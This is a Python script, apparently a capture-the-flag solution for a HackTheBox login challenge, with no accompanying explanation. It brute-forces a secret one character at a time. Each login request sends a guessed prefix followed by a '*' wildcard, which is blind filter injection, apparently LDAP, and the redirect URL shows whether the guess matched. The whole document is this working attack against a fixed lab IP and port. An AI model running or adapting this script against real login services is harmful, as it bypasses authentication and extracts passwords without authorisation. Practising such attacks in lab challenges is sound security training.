import requests
import string

headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"}
url = "http://178.62.20.218:30898/login"
password = "HTB{"
data = {"username" : "Reese", "password" : password}
a = True

while(a):
    for i in range(0, 128):
        temp1 = password + chr(i) + "*"
        temp = {"username" : "Reese", "password" : temp1}
        coba = requests.post(url, headers=headers, data=temp)
        if (coba.url == url + "?message=Authentication%20failed") :
            print("Trying " + temp1)
            temp = temp
        elif (coba.url == "http://178.62.20.218:30898/" and chr(i) != '*'):
            password += chr(i)
            print("Found ! -> " + password)
            break
        elif i == 127:
            a = False

print("Flag is : " + password)
